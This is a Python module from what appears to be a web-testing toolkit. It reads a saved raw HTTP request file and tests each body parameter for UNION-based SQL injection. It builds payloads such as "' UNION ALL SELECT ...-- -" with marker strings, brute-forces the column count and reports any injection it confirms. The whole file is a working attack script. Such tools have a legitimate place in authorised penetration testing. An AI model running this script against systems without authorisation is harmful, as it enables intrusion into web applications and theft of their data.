# request_sqli.py
import requests
from rich.prompt import Prompt
from .utils import console


# --------------------------------
# Parse raw HTTP request
# --------------------------------
def parse_raw_request(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.read().splitlines()

    method, req_path, _ = lines[0].split(" ", 2)
    headers = {}
    host = ""

    i = 1
    while i < len(lines) and lines[i].strip():
        k, v = lines[i].split(":", 1)
        headers[k.strip()] = v.strip()
        if k.lower() == "host":
            host = v.strip()
        i += 1

    body = "\n".join(lines[i + 1:]).strip()
    return method, host, req_path, headers, body


def extract_params(body):
    params = {}
    if "=" in body:
        for pair in body.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v
    return params


# --------------------------------
# Main SQLi logic
# --------------------------------
def run_request_sqli():
    console.print("[bold cyan]--- Request-based SQL Injection Tester ---[/bold cyan]")

    req_file = Prompt.ask("[?] Enter path of request .txt file")
    scheme = Prompt.ask("[?] Scheme (http/https)", default="http")

    # hard marker parts (same as your manual payload logic)
    prefix = "qxqqq"
    suffix = "zppqz"

    try:
        method, host, path, headers, body = parse_raw_request(req_file)
    except Exception as e:
        console.print(f"[-] Failed to parse request: {e}", style="bold red")
        return

    url = f"{scheme}://{host}{path}"
    params = extract_params(body)

    if not params:
        console.print("[-] No injectable parameters found.", style="bold red")
        return

    console.print(f"[+] Found parameters: {list(params.keys())}")

    session = requests.Session()

    # baseline
    baseline = session.request(method, url, headers=headers, data=params, timeout=10)
    baseline_text = baseline.text

    for param in params:
        console.print(f"[*] Testing parameter: {param}")

        # brute-force column count
        for col_count in range(1, 11):
            for i in range(col_count):
                cols = ["NULL"] * col_count

                cols[i] = (
                    "CONCAT("
                    f"'{prefix}',"
                    "HEX(RAND()),"
                    f"'{suffix}'"
                    ")"
                )

                payload = "' UNION ALL SELECT " + ",".join(cols) + "-- -"

                test_params = params.copy()
                test_params[param] = payload

                try:
                    res = session.request(
                        method,
                        url,
                        headers=headers,
                        data=test_params,
                        timeout=10
                    )
                except requests.RequestException:
                    continue

                # VALIDATION
                if prefix in res.text and suffix in res.text:
                    console.print("\n[bold green][+] UNION SQL Injection CONFIRMED[/bold green]")
                    console.print(f"Parameter   : [yellow]{param}[/yellow]")
                    console.print(f"Columns     : [yellow]{col_count}[/yellow]")
                    console.print(f"Payload     : [yellow]{payload}[/yellow]")
                    return

    console.print("[bold red][-] No SQL injection detected via request file.[/bold red]")
